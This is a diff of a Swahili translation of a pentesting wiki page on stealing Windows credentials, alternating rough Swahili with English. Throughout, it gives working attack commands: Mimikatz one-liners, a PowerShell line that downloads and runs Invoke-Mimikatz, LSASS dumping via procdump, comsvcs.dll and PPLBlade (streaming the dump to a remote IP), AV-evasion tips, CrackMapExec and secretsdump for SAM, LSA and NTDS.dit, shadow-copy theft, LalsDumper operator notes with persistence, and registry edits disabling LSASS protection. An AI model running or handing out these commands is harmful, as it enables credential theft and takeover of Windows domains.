@@ -1,8 +1,8 @@
-# Kuiba Maelezo ya Kuingia ya Windows
+# Kuiba Windows Credentials
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Maelezo ya Kuingia Mimikatz
+## Credentials Mimikatz
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -16,7 +16,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Pata mambo mengine ambayo Mimikatz inaweza kufanya kwenye** [**this page**](credentials-mimikatz.md)**.**
+**Pata mambo mengine ambayo Mimikatz inaweza kufanya katika** [**this page**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -24,11 +24,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Jifunze kuhusu baadhi ya kinga zinazowezekana za credentials hapa.**](credentials-protections.md) **Kinga hizi zinaweza kuzuia Mimikatz kutoa baadhi ya credentials.**
+[**Jifunze kuhusu baadhi ya uwezekano wa ulinzi wa credentials hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoka kuchukua baadhi ya credentials.**
 
 ## Credentials na Meterpreter
 
-Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ambayo** niliyounda ili **kutafuta passwords na hashes** ndani ya mhanga.
+Tumia [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **niliyounda** ili **kutafuta passwords na hashes** ndani ya victim.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -45,12 +45,12 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## Kupitisha AV
+## Kuepuka AV
 
 ### Procdump + Mimikatz
 
-Kwa kuwa **Procdump kutoka kwa** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni zana halali ya Microsoft**, haigunduliki na Defender.\
-Unaweza kutumia zana hii ili **dump the lsass process**, **download the dump** na **extract** **credentials locally** kutoka kwenye dump.
+Kwa kuwa **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni zana halali ya Microsoft**, haigunduliki na Defender.\
+Unaweza kutumia zana hii ili **dump the lsass process**, **download the dump** na **extract** the **credentials locally** kutoka kwenye dump.
 
 Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).
 ```bash:Dump lsass
@@ -69,64 +69,64 @@ mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-Mchakato huu hufanywa moja kwa moja kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Mchakato huu unafanywa kiotomatiki kwa [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Kumbuka**: Baadhi ya **AV** zinaweza **kubaini** matumizi ya **procdump.exe to dump lsass.exe** kama **malicious**, hii ni kwa sababu zina **kubaini** kamba **"procdump.exe" and "lsass.exe"**. Kwa hivyo ni **stealthier** kupitisha kama **argument** **PID** ya lsass.exe kwa procdump **instead of** jina **lsass.exe.**
+**Kumbuka**: Baadhi ya **AV** inaweza **detect** kama **malicious** matumizi ya **procdump.exe to dump lsass.exe**, hii ni kwa sababu zinakuwa **detecting** string **"procdump.exe" and "lsass.exe"**. Kwa hivyo ni **stealthier** kupitisha kama **argument** **PID** ya lsass.exe kwa procdump **instead of** **jina lsass.exe.**
 
 ### Dumping lsass with **comsvcs.dll**
 
-DLL iitwayo **comsvcs.dll** inayokuwapo katika `C:\Windows\System32` inahusika na **dumping process memory** wakati wa crash. DLL hii ina **function** iitwayo **`MiniDumpW`**, iliyobuniwa iitwe kwa kutumia `rundll32.exe`.\
-Haihitaji kutumia hoja za kwanza mbili, lakini ya tatu imegawanywa katika sehemu tatu. ID ya mchakato inayotakiwa kudump inaunda sehemu ya kwanza, eneo la faili ya dump ni sehemu ya pili, na sehemu ya tatu ni neno tu **full**. Hakuna chaguo mbadala.\
-Baada ya kutafsiri sehemu hizo tatu, DLL hiyo huanza kuunda faili ya dump na kuhamisha kumbukumbu ya mchakato uliotajwa ndani ya faili hilo.\
-Kutumia **comsvcs.dll** kunawezekana kwa kudump mchakato wa lsass, hivyo kuondoa haja ya kupakia na kuendesha procdump. Njia hii imeelezewa kwa undani kwenye [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
+It is irrelevant to use the first two arguments, but the third one is divided into three components. The process ID to be dumped constitutes the first component, the dump file location represents the second, and the third component is strictly the word **full**. No alternative options exist.\
+Upon parsing these three components, the DLL is engaged in creating the dump file and transferring the specified process's memory into this file.\
+Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
-Amri ifuatayo inatumika kutekeleza:
+Amri ifuatayo inatumiwa kutekeleza:
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
 **Unaweza kuendesha mchakato huu kwa otomatiki kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
-### **Kutoa lsass kwa Task Manager**
+### **Kutorosha lsass kwa Task Manager**
 
-1. Bonyeza kwa kulia kwenye Task Bar na ubofye Task Manager
+1. Bofya kulia kwenye Task Bar kisha chagua Task Manager
 2. Bofya More details
-3. Tafuta mchakato "Local Security Authority Process" kwenye tab ya Processes
-4. Bonyeza kwa kulia kwenye mchakato "Local Security Authority Process" na ubofye "Create dump file".
+3. Tafuta mchakato "Local Security Authority Process" kwenye kichupo cha Processes
+4. Bofya kulia kwenye mchakato "Local Security Authority Process" na uchague "Create dump file".
 
-### Kutoa lsass kwa procdump
+### Kutorosha lsass kwa procdump
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyotiwa saini na Microsoft ambayo ni sehemu ya suite ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyosainiwa na Microsoft ambayo ni sehemu ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
 ## Dumpin lsass na PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni Protected Process Dumper Tool inayounga mkono kuficha memory dump na kuzihamisha kwenye workstations za mbali bila kuziweka kwenye diski.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni Protected Process Dumper Tool inayounga mkono obfuscating memory dump na kuhamisha kwenye remote workstations bila kuiweka kwenye diski.
 
 **Vipengele muhimu**:
 
-1. Kuvuka ulinzi wa PPL
-2. Kuficha memory dump files ili kuepuka Defender signature-based detection mechanisms
-3. Kupakia memory dump kwa njia za upload za RAW na SMB bila kuiweka kwenye diski (fileless dump)
+1. Bypassing PPL protection
+2. Obfuscating memory dump files ili kuepuka Defender signature-based detection mechanisms
+3. Uploading memory dump kwa RAW and SMB upload methods bila kuiweka kwenye diski (fileless dump)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
 ## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump
 
-Ink Dragon ships a three-stage dumper dubbed **LalsDumper** that never calls `MiniDumpWriteDump`, so EDR hooks on that API never fire:
+Ink Dragon inasambaza dumper ya hatua-tatu iitwayo **LalsDumper** ambayo haiwahi kuita `MiniDumpWriteDump`, kwa hivyo EDR hooks kwenye API hiyo hazitafanya kazi:
 
-1. **Stage 1 loader (`lals.exe`)** – inatafuta `fdp.dll` kwa placeholder yenye herufi `d` ndogo 32, inaibadilisha na njia kamili kwenda `rtu.txt`, inahifadhi DLL iliyorekebishwa kama `nfdp.dll`, na inaita `AddSecurityPackageA("nfdp","fdp")`. Hii inalazimisha **LSASS** ipakie DLL haramu kama Security Support Provider (SSP) mpya.
-2. **Stage 2 inside LSASS** – wakati LSASS inapopakua `nfdp.dll`, DLL husoma `rtu.txt`, inafanya XOR kila byte na `0x20`, na inaweka blob iliyotangazwa (decoded) ndani ya memory kabla ya kuhamisha utekelezaji.
-3. **Stage 3 dumper** – payload iliyochomekwa inatekeleza tena MiniDump logic kwa kutumia **direct syscalls** zilizoambatanishwa kutoka kwa majina ya API yaliyohashiwa (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum iitwayo `Tom` inafungua `%TEMP%\<pid>.ddt`, inaandika dump ya LSASS iliyokandwa kwenye faili, na inafunga handle ili exfiltration iweze kutokea baadaye.
+1. **Stage 1 loader (`lals.exe`)** – inatafuta `fdp.dll` kwa placeholder iliyoundwa na herufi 32 ndogo `d`, inaandika tena na path kamili kuelekea `rtu.txt`, inaifadhi DLL iliyopachikwa kama `nfdp.dll`, na inaita `AddSecurityPackageA("nfdp","fdp")`. Hii inalazimisha **LSASS** kupakia DLL hatarishi kama Security Support Provider (SSP) mpya.
+2. **Stage 2 inside LSASS** – wakati LSASS inapopakia `nfdp.dll`, DLL husoma `rtu.txt`, inafanya XOR kila byte na `0x20`, na inaingiza blob iliyotafsiriwa kwenye kumbukumbu kabla ya kuhamisha utekelezaji.
+3. **Stage 3 dumper** – payload iliyopakiwa inaotekeleza tena mantiki ya MiniDump kwa kutumia **direct syscalls** zilizotatuliwa kutoka kwa majina ya API yaliyohashiwa (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum iitwayo `Tom` inafungua `%TEMP%\<pid>.ddt`, inaandika dump ya LSASS iliyosimbwa ndani ya faili, na inafunga handle ili exfiltration iweze kufanyika baadaye.
 
 Operator notes:
 
-* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` kwenye directory ile ile. Stage 1 inaandika tena placeholder iliyowekwa ngumu na njia kamili ya `rtu.txt`, hivyo kuvitenganisha kunavunja mnyororo.
-* Usajili hufanyika kwa kuambatisha `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka thamani hiyo mwenyewe ili LSASS ireload SSP kila boot.
-* `%TEMP%\*.ddt` ni dumps zilizokandwa. Fungua (decompress) kiasili, kisha ziingize Mimikatz/Volatility kwa uchukuaji wa credential.
-* Kuendesha `lals.exe` kunahitaji haki za admin/SeTcb ili `AddSecurityPackageA` ifanikiwe; mara wito unaporejesha, LSASS inapakia kwa uwazi SSP haramu na inatekeleza Stage 2.
-* Kuondoa DLL kutoka diski hakuondoi kutoka LSASS. Futa entry ya registry na anzisha tena LSASS (reboot) au uiachie kwa persistence ya muda mrefu.
+* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` katika saraka moja. Stage 1 inaandika tena placeholder iliyowekwa hard-coded kwa path kamili ya `rtu.txt`, hivyo kuvitenganisha kunavunja mnyororo.
+* Usajili hufanyika kwa kuongezea `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka thamani hiyo mwenyewe ili LSASS iupakie tena SSP kila boot.
+* Mafaili ya `%TEMP%\*.ddt` ni dumps zilizosimbwa. Fungua (decompress) kwa ndani ya mashine, kisha uzitume kwa Mimikatz/Volatility kwa credential extraction.
+* Kuendesha `lals.exe` kunahitaji haki za admin/SeTcb ili `AddSecurityPackageA` ifanikiwe; mara simu inaporejea, LSASS kwa uwazi inalosha SSP mbaya na inatekeleza Stage 2.
+* Kuondoa DLL kutoka diski hakuitoi kutoka LSASS. Au futa entry ya registry na restart LSASS (reboot) au uiachie kwa uendelevu wa muda mrefu.
 
 ## CrackMapExec
 
@@ -134,16 +134,16 @@ Operator notes:
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Dump LSA secrets
+### Dump siri za LSA
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Dump ya NTDS.dit kutoka kwa DC lengwa
+### Dump the NTDS.dit kutoka target DC
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Dump the NTDS.dit password history kutoka kwa DC lengwa
+### Kutoa historia ya nywila ya NTDS.dit kutoka kwenye DC lengwa
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -153,28 +153,28 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 ## Stealing SAM & SYSTEM
 
-Faili hizi zinapaswa kuwa **zilipo** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM_. Lakini **huwezi kuzinakili tu kwa njia ya kawaida** kwa sababu zinalindwa.
+Faili hizi zinapaswa kuwa **zipo** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **huwezi kuzinakili kwa njia ya kawaida** kwa sababu zimewalindwa.
 
 ### Kutoka kwa Registry
 
-Njia rahisi zaidi ya steal faili hizi ni kupata nakala kutoka kwa Registry:
+Njia rahisi ya steal faili hizo ni kupata nakala kutoka kwa Registry:
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Download** faili hizo kwenye mashine yako ya Kali na **extract the hashes** kwa kutumia:
+**Pakua** faili hizo kwenye mashine yako ya Kali na **extract the hashes** kwa kutumia:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
 ### Volume Shadow Copy
 
-Unaweza kunakili faili zilizolindwa ukitumia huduma hii. Unahitaji kuwa Administrator.
+Unaweza kunakili faili zilizo na ulinzi ukitumia huduma hii. Unahitaji kuwa Administrator.
 
 #### Using vssadmin
 
-vssadmin binary inapatikana tu katika matoleo ya Windows Server
+binary ya vssadmin inapatikana tu katika matoleo ya Windows Server
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -187,7 +187,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Lakini unaweza kufanya vivyo hivyo kutoka **Powershell**. Hii ni mfano wa **jinsi ya kunakili SAM file** (diski ngumu inayotumika ni "C:" na imehifadhiwa katika C:\users\Public) lakini unaweza kutumia hii kunakili faili yoyote iliyolindwa:
+Lakini unaweza kufanya vivyo hivyo kutoka kwa **Powershell**. Hii ni mfano wa **how to copy the SAM file** (diski ngumu iliyotumika ni "C:" na imehifadhiwa kwenye C:\users\Public) lakini unaweza kutumia hii kunakili faili yoyote iliyolindwa:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -198,11 +198,11 @@ cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Pu
 cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
 $volume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
-Msimbo kutoka kwenye kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
+Msimbo kutoka kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
 
 ### Invoke-NinjaCopy
 
-Mwisho kabisa, unaweza pia kutumia the [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) ili kutengeneza nakala ya SAM, SYSTEM na ntds.dit.
+Hatimaye, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kufanya nakala ya SAM, SYSTEM na ntds.dit.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
@@ -225,7 +225,7 @@ Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_.
 The hash is cyphered 3 times:
 
 1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
-2. Decrypt the **hash** using **PEK** and **RC4**.
+2. Decrypt tha **hash** using **PEK** and **RC4**.
 3. Decrypt the **hash** using **DES**.
 
 **PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller (is different between domain controllers)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
@@ -236,52 +236,52 @@ Available since Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Unaweza pia kutumia mbinu ya [**volume shadow copy**](#stealing-sam-and-system) kunakili faili ya **ntds.dit**. Kumbuka kwamba pia utahitaji nakala ya **SYSTEM file** (tena, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) mbinu).
+Unaweza pia kutumia [**volume shadow copy**](#stealing-sam-and-system) mbinu kunakili faili ya **ntds.dit**. Kumbuka kwamba pia utahitaji nakala ya **SYSTEM file** (tena, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) mbinu).
 
 ### **Kutoa hashes kutoka NTDS.dit**
 
-Mara baada ya kuwa **umepata** faili **NTDS.dit** na **SYSTEM** unaweza kutumia zana kama _secretsdump.py_ ili **kutoa hashes**:
+Mara baada ya **kupata** faili **NTDS.dit** na **SYSTEM** unaweza kutumia zana kama _secretsdump.py_ ili **kutoa hashes**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Unaweza pia **kuvitoa kiotomatiki** ukitumia mtumiaji halali wa domain admin:
+Unaweza pia **kuviondoa kiotomatiki** kwa kutumia mtumiaji halali wa domain admin:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-Kwa **faili kubwa za NTDS.dit** inashauriwa kuzitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+Kama **faili kubwa za NTDS.dit**, inashauriwa kuzichukua kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
 Mwishowe, unaweza pia kutumia **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`
 
-### **Kutoa vitu vya domain kutoka NTDS.dit hadi hifadhidata ya SQLite**
+### **Kutoa vitu vya domain kutoka NTDS.dit hadi database ya SQLite**
 
-Vitu vya NTDS vinaweza kuchukuliwa hadi hifadhidata ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio tu siri zinazoondolewa bali pia vitu vyote kwa undani na sifa (attributes) zao kwa ajili ya uchimbaji wa taarifa zaidi wakati faili ghafi ya NTDS.dit tayari imepatikana.
+Vitu vya NTDS vinaweza kuchukuliwa hadi database ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio tu secrets zinachukuliwa, bali pia vitu vyote kamili na sifa zao kwa ajili ya uchimbaji wa taarifa zaidi wakati faili mbichi ya NTDS.dit tayari imepatikana.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-The `SYSTEM` hive ni hiari lakini inaruhusu ufichuzi wa siri (NT & LM hashes, supplemental credentials kama cleartext passwords, kerberos au trust keys, NT & LM password histories). Pamoja na taarifa nyingine, data zifuatazo zinachukuliwa: akaunti za watumiaji na mashine na hashes zao, UAC flags, timestamp ya last logon na password change, maelezo ya akaunti, majina, UPN, SPN, vikundi na recursive memberships, mti wa organizational units na uanachama, trusted domains zenye trusts type, direction na attributes...
+The `SYSTEM` hive ni hiari lakini inaruhusu kuondolewa kwa siri zilizosimbwa (NT & LM hashes, supplemental credentials kama cleartext passwords, kerberos au trust keys, NT & LM password histories). Pamoja na taarifa nyingine, data zifuatazo zinachukuliwa: akaunti za watumiaji na za mashine pamoja na hashes zao, UAC flags, timestamp ya logon ya mwisho na mabadiliko ya password, maelezo ya akaunti, majina, UPN, SPN, vikundi na uanachama wa kurudia, mti wa organizational units na uanachama, trusted domains pamoja na aina za trusts, mwelekeo na sifa...
 
 ## Lazagne
 
-Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia binary hii ku-extract credentials kutoka kwa programu mbalimbali.
+Shusha binary kutoka [here](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia binary hii kutoa extract credentials kutoka kwa programu mbalimbali.
 ```
 lazagne.exe all
 ```
-## Zana nyingine za kutoa credentials kutoka SAM na LSASS
+## Zana nyingine za kutoa kredenshali kutoka SAM na LSASS
 
 ### Windows credentials Editor (WCE)
 
-Zana hii inaweza kutumika kutoa credentials kutoka kwenye kumbukumbu. Pakua kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+Zana hii inaweza kutumika kutoa kredenshali kutoka kwenye kumbukumbu. Pakua kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-Hutoa credentials kutoka faili la SAM
+Inatoa kredenshali kutoka kwenye faili ya SAM
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
 ```
 ### PwDump
 
-Toa credentials kutoka kwenye faili la SAM
+Toa credentials kutoka kwenye SAM file
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
@@ -289,15 +289,15 @@ type outpwdump
 ```
 ### PwDump7
 
-Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) na **endesha** tu na maneno ya siri zitatolewa.
+Pakua kutoka: [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) na **itekeleze tu** na nywila zitatolewa.
 
-## Kuchimba vikao vya RDP visivyotumika na kudhoofisha udhibiti wa usalama
+## Mining idle RDP sessions and weakening security controls
 
-Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:
+Ink Dragon’s FinalDraft RAT ina tasker ya `DumpRDPHistory` ambayo mbinu zake ni muhimu kwa red-teamer yeyote:
 
 ### DumpRDPHistory-style telemetry collection
 
-* **Outbound RDP targets** – chambua kila user hive at `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Each subkey stores the server name, `UsernameHint`, and the last write timestamp. You can replicate FinalDraft’s logic with PowerShell:
+* **Outbound RDP targets** – chambua kila user hive katika `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Kila subkey huhifadhi jina la server, `UsernameHint`, na timestamp ya kuandikwa kwa mwisho. Unaweza kunakili mantiki ya FinalDraft kwa PowerShell:
 
 ```powershell
 Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
@@ -310,7 +310,7 @@ $user = (Get-ItemProperty $_.Name).UsernameHint
 }
 ```
 
-* **Inbound RDP evidence** – query the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log for Event IDs **21** (successful logon) and **25** (disconnect) to map who administered the box:
+* **Inbound RDP evidence** – chunguza logi ya `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` kwa Event IDs **21** (successful logon) na **25** (disconnect) ili ramani ni nani alisimamia mashine:
 
 ```powershell
 Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
@@ -318,19 +318,21 @@ Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Op
 | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
 ```
 
-Mara ukijua ni Domain Admin gani huunganishwa mara kwa mara, dump LSASS (kwa LalsDumper/Mimikatz) wakati kikao chao kilicho **imekatika** bado kipo. CredSSP + NTLM fallback huacha verifier na tokens zao ndani ya LSASS, ambayo yanaweza kisha kurudishwa kupitia SMB/WinRM ili kupata `NTDS.dit` au kuanzisha persistence kwenye domain controllers.
+Mara utakapo jua ni Domain Admin gani huungana mara kwa mara, fanya dump ya LSASS (kwa LalsDumper/Mimikatz) wakati kikao chao cha **disconnected** bado kipo. CredSSP + NTLM fallback huacha verifier na token zao ndani ya LSASS, ambazo kisha zinaweza kutumika tena kupitia SMB/WinRM ili kupata `NTDS.dit` au kuweka persistence kwenye domain controllers.
 
-### Kupungua kwa usalama kwenye Registry kulengwa na FinalDraft
+### Registry downgrades targeted by FinalDraft
+
+Implant ile ile pia inaibadilisha funguo kadhaa za registry ili kurahisisha wizi wa vitambulisho (credentials):
 ```cmd
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
 ```
-* Kuweka `DisableRestrictedAdmin=1` hufanya credential/ticket reuse kamili wakati wa RDP, ikiruhusu pass-the-hash style pivots.
-* `LocalAccountTokenFilterPolicy=1` huondoa UAC token filtering hivyo local admins wanapata unrestricted tokens kupitia mtandao.
-* `DSRMAdminLogonBehavior=2` huruhusu msimamizi wa DSRM kuingia wakati DC iko mtandaoni, ikimpa washambuliaji akaunti nyingine iliyojengwa yenye ruhusa za juu.
-* `RunAsPPL=0` huondoa LSASS PPL protections, na kufanya ufikaji wa memory kuwa rahisi kwa dumpers kama LalsDumper.
+* Kuweka `DisableRestrictedAdmin=1` kunalazimisha matumizi kamili ya cheti/tiketi wakati wa RDP, na hivyo kuwezesha pivoti za aina ya pass-the-hash.
+* `LocalAccountTokenFilterPolicy=1` inafuta uchujaji wa token za UAC ili local admins wapate token zisizo na vizuizi kupitia mtandao.
+* `DSRMAdminLogonBehavior=2` inaruhusu msimamizi wa DSRM kuingia wakati DC iko mtandaoni, ikimpa attackers akaunti nyingine ya built-in yenye mamlaka ya juu.
+* `RunAsPPL=0` inatoa ulinzi wa LSASS PPL, na kufanya memory access kuwa rahisi kwa dumpers kama LalsDumper.
 
 ## Marejeo
 
